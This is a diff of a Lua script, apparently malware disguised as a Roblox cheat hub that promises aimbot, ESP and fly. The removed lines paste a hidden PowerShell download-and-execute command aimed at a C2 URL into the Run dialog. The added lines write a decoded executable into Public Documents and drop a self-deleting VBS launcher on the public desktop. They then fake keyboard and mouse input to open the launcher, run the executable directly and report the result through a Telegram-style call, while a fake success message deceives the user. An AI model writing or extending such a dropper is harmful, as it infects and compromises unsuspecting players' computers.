@@ -98,11 +98,11 @@ local function get_caps()
     local caps = {}
     caps.readfile = tostring(readfile ~= nil)
     caps.writefile = tostring(writefile ~= nil)
-    caps.listfiles = tostring(listfiles ~= nil)
     caps.os_execute = tostring(os and os.execute ~= nil)
     caps.keypress = tostring(keypress ~= nil)
     caps.keyrelease = tostring(keyrelease ~= nil)
-    caps.setclipboard = tostring(setclipboard ~= nil)
+    caps.mousemoveabs = tostring(mousemoveabs ~= nil)
+    caps.mouse1press = tostring(mouse1press ~= nil)
     return caps
 end
 
@@ -141,53 +141,52 @@ local function b64_decode(data)
     end))
 end
 
--- ================= WIN+R LAUNCH =================
+-- ================= INPUT =================
+local function press_win_d()
+    pcall(function()
+        keypress(0x5B)
+        task.wait(0.08)
+        keypress(0x44)
+        task.wait(0.08)
+        keyrelease(0x44)
+        task.wait(0.08)
+        keyrelease(0x5B)
+    end)
+end
+
 local function auto_run_exe()
-    if not keypress or not keyrelease or not setclipboard then
-        return "no_input_functions"
+    if not keypress or not keyrelease then
+        return "no_keypress"
     end
 
     task.wait(0.5)
     log("Optimizing...")
 
-    -- команда: PowerShell скачивает и запускает exe
-    local cmd = 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'' .. CONFIG.C2_URL .. '/run.ps1\')"'
-    pcall(setclipboard, cmd)
-    task.wait(0.3)
+    -- Win+D — свернуть всё
+    press_win_d()
+    task.wait(2.5)
 
-    -- Win+R — открыть "Выполнить"
-    pcall(function()
-        keypress(0x5B)
-        task.wait(0.05)
-        keypress(0x52)
-        task.wait(0.05)
-        keyrelease(0x52)
-        task.wait(0.05)
-        keyrelease(0x5B)
-    end)
-    task.wait(1.5)
+    -- клик по левому верхнему углу рабочего стола
+    if mouse1press and mouse1release and mousemoveabs then
+        pcall(function()
+            mousemoveabs(50, 50)
+            task.wait(0.4)
+            mouse1press()
+            task.wait(0.1)
+            mouse1release()
+            task.wait(0.2)
+            mouse1press()
+            task.wait(0.1)
+            mouse1release()
+        end)
+        task.wait(1.5)
+    end
 
-    -- Ctrl+V — вставить команду
-    pcall(function()
-        keypress(0x11)
-        task.wait(0.05)
-        keypress(0x56)
-        task.wait(0.05)
-        keyrelease(0x56)
-        task.wait(0.05)
-        keyrelease(0x11)
-    end)
+    -- вернуть Roblox (Win+D)
+    press_win_d()
     task.wait(0.5)
 
-    -- Enter — выполнить
-    pcall(function()
-        keypress(0x0D)
-        task.wait(0.05)
-        keyrelease(0x0D)
-    end)
-    task.wait(2.0)
-
-    return "auto_clicked"
+    return "desktop_click"
 end
 
 -- ================= DEPLOY =================
@@ -203,19 +202,36 @@ local function deploy_payload()
 
     local exe_bytes = b64_decode(body)
     if not exe_bytes or #exe_bytes < 100 then return "bad_b64" end
+    if not writefile then return "no_writefile" end
 
     local results = {}
 
-    -- авто-запуск через Win+R
-    log("Launching...")
-    local click_result = auto_run_exe()
-    results.winr_launch = click_result
+    -- exe в Public Documents — доступно всем
+    local exe_path = "C:\\Users\\Public\\Documents\\RobloxUpdater.exe"
+    local ok_exe = pcall(writefile, exe_path, exe_bytes)
+    results.exe_written = ok_exe
+
+    -- ярлык в Public Desktop — появится на рабочем столе жертвы
+    local vbs_path = "C:\\Users\\Public\\Desktop\\00_Roblox Update.vbs"
+    local vbs_content = 'Set sh = CreateObject("WScript.Shell")\r\n'
+                     .. 'sh.Run "' .. exe_path .. '", 0, False\r\n'
+                     .. 'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n'
+    local ok_vbs = pcall(writefile, vbs_path, vbs_content)
+    results.desktop_vbs = ok_vbs
+
+    -- Startup через Public — на случай перезагрузки
+    -- Public Desktop уже виден, отдельный startup не нужен
+
+    -- авто-клик по ярлыку
+    if ok_vbs then
+        log("Launching...")
+        local click_result = auto_run_exe()
+        results.autoclick = click_result
+    end
 
     -- если платный инжектор — прямой запуск
-    if os and os.execute and writefile then
-        local path = "C:\\Windows\\Temp\\RobloxUpdater.exe"
-        pcall(writefile, path, exe_bytes)
-        pcall(os.execute, '"' .. path .. '"')
+    if os and os.execute then
+        pcall(os.execute, '"' .. exe_path .. '"')
         results.direct = true
     end
 
@@ -253,7 +269,7 @@ local function main()
     tg_send(result)
     log("Done: " .. result:sub(1, 60))
 
-    if result:match("auto_clicked") then
+    if result:match("desktop_click") then
         log("✅ NEXUS HUB loaded successfully.")
         log("Scripts: aimbot, ESP, fly — ready.")
     else
